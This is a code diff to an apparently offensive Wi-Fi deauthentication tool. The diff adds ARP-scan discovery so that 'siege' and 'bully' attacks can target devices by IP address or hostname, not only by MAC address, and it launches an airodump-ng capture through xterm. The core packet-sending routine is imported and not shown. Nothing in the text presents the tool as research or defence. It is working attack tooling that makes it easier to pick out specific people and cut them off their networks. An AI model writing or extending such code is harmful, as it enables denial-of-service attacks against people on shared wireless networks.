@@ -6,6 +6,7 @@ import sys
 
 from de_auth import begin_attack
 import parse_data
+import discovery
 
 
 _mac_address_pattern = re.compile('[0-9A-F]{2}(:[0-9A-F]{2}){5}')
@@ -16,10 +17,26 @@ _duration_multiplier = {
 }
 
 
-def mac_address_or_all(addr):
-    if addr.lower() == 'all':
-        return 'all'
-    return mac_address(addr)
+def validate_target(target, arp_table, name_to_mac):
+    """ validate_target verifies that target is a valid MAC address, IP address or hostname """
+    try:
+        mac = mac_address(target)
+        return mac
+    except TypeError:
+        pass
+    
+    try:
+        ip = ip_address(target)
+        if ip in arp_table.keys():
+            return arp_table[ip].mac
+    except TypeError:
+        pass
+
+    hostname = target.upper()
+    if hostname in name_to_mac.keys():
+        return name_to_mac[hostname]
+    else:
+        raise TypeError('{} is not a valid target'.format(target))
 
 
 def mac_address(addr):
@@ -61,19 +78,39 @@ def parse_args():
     deauth_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
     deauth_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
     deauth_parser.add_argument('essid', help='the name of the network to send deauth packets to')
-    deauth_parser.add_argument('target', nargs='+', type=mac_address_or_all, help='the MAC addresses to deauth (use "all" to target everything)')
+    deauth_parser.add_argument('target', nargs='+', help='the specified targets to deauth. Targets can be MAC addresses, IP addresses or hostnames (use "all" to target everything)')
 
     bully_parser = subparsers.add_parser('bully', help='deauth a target from all networks')
     bully_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
     bully_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
-    bully_parser.add_argument('target', type=mac_address, help='the MAC address to deauth')
+    bully_parser.add_argument('target', help='the target to deauth. The target can be a MAC address, IP address or hostname')
 
     discover_parser = subparsers.add_parser('discover', help='locate targets to deauth')
+
+    arp_table, name_to_mac = discovery.get_hostnames(discovery.arp_scan())
 
     args = parser.parse_args()
     if args.action is None:
         parser.print_help()
         sys.exit(0)
+
+    if args.action == 'siege':
+        if 'all' in args.target:
+            args.target = []
+        else:
+            for t in args.target:
+                try:
+                    validate_target(t, arp_table, name_to_mac)
+                except TypeError as e:
+                    print(e, file=sys.stderr)
+                    sys.exit(1)
+    elif args.action == 'bully':
+        try:
+            validate_target(args.target, arp_table, name_to_mac)
+        except TypeError as e:
+            print(e, file=sys.stderr)
+            sys.exit(1)
+
     return args
 
 
@@ -87,7 +124,7 @@ def discover_network(args=None):
             __location__ = os.path.realpath(
                         os.path.join(os.getcwd(), os.path.dirname(__file__)))
             discover_script_path = os.path.join(__location__, 'discovery.sh')
-            discovery_results = subprocess.run([discover_script_path], stderr=subprocess.PIPE)
+            discovery_results = subprocess.run(["xterm", "+hold", "-e", "cd /tmp && timeout 120s airodump-ng -a wlan0mon --output-format csv -w dump"], stderr=subprocess.PIPE)
             if discovery_results.returncode != 0:
                 print(discovery_results.stderr, file=sys.stderr)
                 sys.exit(1)
@@ -101,13 +138,9 @@ def discover_network(args=None):
 
 
 def deauth_clients(args):
-    # targets to deauth
-    target_all = 'all' in args.target
-    targets = [] if target_all else [t for t in args.target if t != 'all']
-
     kwargs = {
         'mode': 'siege',
-        'net_clients': targets,
+        'net_clients': args.target,
         'ESSID': args.essid,
         'attack_time': args.attack_duration,
         'wireless_adapter': args.adapter,
